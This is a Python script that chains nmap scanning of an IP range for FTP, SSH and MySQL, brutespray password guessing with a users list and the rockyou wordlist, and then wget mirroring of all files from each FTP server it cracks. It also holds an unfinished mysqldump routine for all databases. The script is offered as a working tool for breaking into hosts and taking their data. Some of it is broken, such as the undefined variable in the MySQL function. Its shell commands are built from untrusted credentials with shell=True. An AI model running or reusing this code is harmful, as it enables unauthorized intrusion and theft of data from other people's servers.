import subprocess
import argparse
import time
import re
from pathlib import Path

def _parse_args():
	parser = argparse.ArgumentParser(description='main.py')
	parser.add_argument('ip', type=str, help='IP range to search for defaults')
	parser.add_argument('-t', '--threads', type=int, default=2, help='Number of threads to run on')
	parser.add_argument('-c', '--clean', type=bool, default=True, help='Clean up files from previous runs')
	args = parser.parse_args()
	return args

def clean_up():
	cmd = "rm -f output.gnmap; rm -rf brutespray-output; rm -rf ftp; " 
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
	# following line runs so we wait until we're done cleaning up
	out, err = proc.communicate()

def run_nmap(ip_range: str):
	cmd = "nmap -p21,22,3306 --open -sV " + ip_range + " -oG output.gnmap"
	proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
	output, error = proc.communicate()
	# print(output.decode('utf-8'))

def run_brutespray(threads: int):
	brute_cmd = "brutespray -f output.gnmap -U ../users.txt -P ../rockyou2.txt -t " + str(threads) + " -c"
	brute_poc = subprocess.Popen(brute_cmd.split(), stdout=subprocess.PIPE)
	brute_out, brute_err = brute_poc.communicate()
	# print(brute_out.decode('utf-8'))

def get_ftp_files(ip, username, password):
	# this probably doesn't work yet
	ftp_cd = "cd ftp; "
	mkdir = "mkdir " + username + "; "
	cd = "cd " + username + "; "
	wget = "wget -q -m ftp://" + username + ":" + password + "@" + ip + "; "
	cmd = ftp_cd + mkdir + cd + wget
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
	out, err = proc.communicate()
	if err is not None:
		print("\tFailed to grab all files")

def get_mysql_files(ip, username, password):
	# this probably doesn't work yet
	mkdir = "mkdir " + username + ":" + ip + ";"
	mysqldump = "mysqldump -h " + ip + " -u" + username + " -p " + password + " --all-databases > " + username + ":" + ip + "/dump.sql"
	proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, shell=True)
	out, err = proc.communicate()
	# if err not None:
	# 	print("files grabbed from",username,":",password,"@",ip)

def make_ftp_folder():
	cmd = "mkdir ftp"
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
	out, err = proc.communicate()

def show_cracked_info():
	cracked_cmd = "cat brutespray-output/*"
	cracked_proc = subprocess.Popen(cracked_cmd.split(), stdout=subprocess.PIPE)
	cracked_out, cracked_err = cracked_proc.communicate()
	print(cracked_out.decode('utf-8'))

if __name__ == "__main__":
	start_time = time.time()
	args = _parse_args()
	# clean up files from previous runs to avoid overlap
	if args.clean:
		clean_up()
	# run nmap
	run_nmap(args.ip)
	print("==== nmap done")
	run_brutespray(args.threads)
	print("==== brutespray done")
	ftp_file = Path("./brutespray-output/21-ftp-success.txt")
	if ftp_file.is_file():
		print("==== retreiving info from ftp servers")
		make_ftp_folder()
		with open("./brutespray-output/21-ftp-success.txt", "r") as f:
			for line in f:
				regex = re.compile(r"Host: (.+) User: (.+) Password: (.+) ")
				match = regex.search(line)
				if match is not None:
					print("\tgrabbing ftp files from " + str(match.group(2)))
					get_ftp_files(match.group(1), match.group(2), match.group(3))
	#show_cracked_info()
	#print("===== Cracked info ========")
